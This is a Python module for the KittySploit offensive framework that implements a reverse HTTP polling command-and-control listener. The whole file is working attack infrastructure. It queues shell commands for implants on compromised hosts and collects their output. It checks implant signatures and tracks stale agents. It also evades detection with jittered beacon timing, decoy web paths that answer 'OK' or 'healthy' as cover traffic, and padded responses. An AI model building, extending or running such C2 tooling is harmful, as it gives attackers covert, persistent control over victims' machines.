#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import base64
import json
import random
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs, urlparse

from kittysploit import *

from lib.c2.beacon_timing import jitter_seconds, pad_response, pick_decoy_path


class Module(Listener):
    __info__ = {
        "name": "Reverse HTTP Polling Listener",
        "description": "HTTP polling C2 with jitter hints, cover-traffic decoys, and implant identity verification.",
        "author": "KittySploit Team",
        "version": "2.0.0",
        "handler": Handler.REVERSE,
        "session_type": "polling",
        "protocol": "http_polling",
    }

    lhost = OptString("0.0.0.0", "Listen address", True)
    lport = OptPort(8088, "Listen port", True)
    url_prefix = OptString("/c2", "URL prefix", False)
    poll_interval = OptInteger(10, "Suggested base poll interval (seconds)", False, True)
    jitter_percent = OptInteger(35, "Jitter percent sent to agents", False, True)
    cover_traffic = OptBool(True, "Serve decoy HTTP paths for cover traffic", False, True)
    response_pad_min = OptInteger(0, "Minimum JSON response size (0=off)", False, True)
    stale_timeout = OptInteger(180, "Alert when agent silent for N seconds (0=off)", False, True)
    alert_on_stale = OptBool(True, "Alert on stale polling agents", False, True)
    implant_public_key = OptString("", "Expected implant Ed25519 public key PEM (from payload build)", False, True)

    def __init__(self, framework=None):
        super().__init__(framework)
        self.httpd = None
        self.running = False
        self._pending_commands = {}
        self._received_output = {}
        self._client_id_to_session = {}
        self._session_to_client_id = {}
        self._last_seen = {}
        self._stale_alerted = set()
        self._decoy_paths = ["/", "/favicon.ico", "/robots.txt", "/health", "/api/status", "/login"]

    def _verify_client(self, client_id: str, sig_b64: str) -> bool:
        pub = str(getattr(getattr(self, "implant_public_key", None), "value", self.implant_public_key) or "").strip()
        if not pub:
            pub = str(getattr(self, "session_implant_public_key", "") or "").strip()
        if not pub or not sig_b64:
            return not pub
        try:
            pad = "=" * (-len(sig_b64) % 4)
            sig = base64.urlsafe_b64decode(sig_b64 + pad)
            from cryptography.hazmat.primitives import serialization
            from cryptography.hazmat.primitives.asymmetric import ed25519

            key = serialization.load_pem_public_key(pub.encode())
            if not isinstance(key, ed25519.Ed25519PublicKey):
                return False
            key.verify(sig, client_id.encode("utf-8"))
            return True
        except Exception:
            return False

    def _ensure_session(self, client_id, client_ip, sig: str = ""):
        pub = str(getattr(getattr(self, "implant_public_key", None), "value", self.implant_public_key) or "").strip()
        if not pub:
            pub = str(getattr(self, "session_implant_public_key", "") or "").strip()
        if pub and not self._verify_client(client_id, sig):
            return None

        if client_id in self._client_id_to_session:
            sid = self._client_id_to_session[client_id]
            self._last_seen[sid] = time.time()
            return sid

        data = {
            "protocol": "http_polling",
            "client_id": client_id,
            "implant_id": client_id,
            "client_ip": client_ip,
            "handler": "reverse",
            "session_type": "polling",
            "listener_type": "reverse_http_polling",
            "pty_mode": False,
        }
        sid = self._create_session("reverse", client_ip, 0, data)
        if sid:
            self._client_id_to_session[client_id] = sid
            self._session_to_client_id[sid] = client_id
            self._pending_commands[sid] = []
            self._received_output[sid] = []
            self._last_seen[sid] = time.time()
            print_success(f"HTTP polling agent {client_id} ({client_ip}) -> session {sid}")
        return sid

    def _poll_payload(self) -> str:
        base = float(self.poll_interval or 10)
        jitter = float(self.jitter_percent or 35)
        payload = {
            "command": "",
            "encoding": "base64",
            "next_sleep": round(jitter_seconds(base, jitter), 2),
        }
        if bool(self.cover_traffic):
            payload["decoy"] = pick_decoy_path(self._decoy_paths)
        body = json.dumps(payload)
        pad = int(self.response_pad_min or 0)
        if pad > 0:
            body = pad_response(body, pad)
        return body

    def _stale_watch_loop(self):
        timeout = int(self.stale_timeout or 0)
        if timeout <= 0:
            return
        while self.running:
            time.sleep(max(5, timeout // 4))
            now = time.time()
            for sid, last in list(self._last_seen.items()):
                if now - last < timeout:
                    continue
                if sid in self._stale_alerted:
                    continue
                self._stale_alerted.add(sid)
                if not bool(self.alert_on_stale):
                    continue
                cid = self._session_to_client_id.get(sid, sid[:8])
                print_warning(f"HTTP polling agent stale: {cid} (no poll for {timeout}s)")
                if self.framework and hasattr(self.framework, "notify_session_disconnected"):
                    self.framework.notify_session_disconnected(
                        sid,
                        reason=f"stale>{timeout}s",
                        label=str(cid),
                    )

    def _handler_class(self):
        listener = self
        prefix = "/" + str(self.url_prefix or "/c2").strip("/")

        class Handler(BaseHTTPRequestHandler):
            def log_message(self, fmt, *args):
                return

            def _send(self, status, body, ctype="text/plain"):
                data = body.encode("utf-8") if isinstance(body, str) else body
                self.send_response(status)
                self.send_header("Content-Type", ctype)
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)

            def do_GET(self):
                parsed = urlparse(self.path)
                path = parsed.path

                if listener.cover_traffic and path in listener._decoy_paths:
                    decoys = ["OK", "healthy", "200", "<!-- static -->"]
                    self._send(200, random.choice(decoys))
                    return

                if path != f"{prefix}/poll":
                    self._send(404, "not found")
                    return

                qs = parse_qs(parsed.query)
                cid = (qs.get("id") or [""])[0]
                sig = (qs.get("sig") or [""])[0]
                if not cid:
                    self._send(400, "missing id")
                    return
                sid = listener._ensure_session(cid, self.client_address[0], sig=sig)
                if not sid:
                    self._send(403, "invalid implant signature")
                    return
                queue = listener._pending_commands.get(sid, [])
                cmd = queue.pop(0) if queue else ""
                payload = json.loads(listener._poll_payload())
                if cmd:
                    payload["command"] = base64.b64encode(cmd.encode()).decode()
                self._send(200, json.dumps(payload), "application/json")

            def do_POST(self):
                parsed = urlparse(self.path)
                if parsed.path != f"{prefix}/result":
                    self._send(404, "not found")
                    return
                length = int(self.headers.get("Content-Length", "0") or 0)
                raw = self.rfile.read(length).decode("utf-8", errors="replace")
                qs = parse_qs(parsed.query)
                cid = (qs.get("id") or [""])[0]
                sig = (qs.get("sig") or [""])[0]
                if not cid:
                    self._send(400, "missing id")
                    return
                sid = listener._ensure_session(cid, self.client_address[0], sig=sig)
                if not sid:
                    self._send(403, "invalid implant signature")
                    return
                try:
                    data = json.loads(raw) if raw else {}
                    output = data.get("output", "")
                    if data.get("encoding") == "base64":
                        output = base64.b64decode(output).decode("utf-8", errors="replace")
                except Exception:
                    output = raw
                listener._append_output(sid, output)
                self._send(200, "ok")

        return Handler

    def run(self, background=False):
        host = str(self.lhost or "0.0.0.0")
        port = int(self.lport or 8088)
        self.httpd = ThreadingHTTPServer((host, port), self._handler_class())
        self.running = True
        self.listener_thread = threading.Thread(target=self.httpd.serve_forever, daemon=True)
        self.listener_thread.start()
        threading.Thread(target=self._stale_watch_loop, daemon=True).start()
        print_success(f"Reverse HTTP polling listener on http://{host}:{port}{self.url_prefix}")
        print_info("Agent: GET /c2/poll?id=<implant_id>&sig=<b64url>, POST /c2/result?id=<implant_id>&sig=...")
        if background:
            return True
        try:
            while self.running:
                time.sleep(0.2)
        except KeyboardInterrupt:
            self.shutdown()
        return True

    def set_pending_command(self, session_id, cmd):
        self._pending_commands.setdefault(session_id, []).append(cmd)

    def _append_output(self, session_id, text):
        self._received_output.setdefault(session_id, []).append(text)
        self._received_output[session_id] = self._received_output[session_id][-500:]
        self._last_seen[session_id] = time.time()
        self._stale_alerted.discard(session_id)

    def get_output(self, session_id, clear=False):
        out = "\n".join(self._received_output.get(session_id, []))
        if clear:
            self._received_output[session_id] = []
        return out

    def get_output_lines(self, session_id, last_n=50):
        return self._received_output.get(session_id, [])[-last_n:]

    def shutdown(self):
        self.running = False
        if self.httpd:
            self.httpd.shutdown()
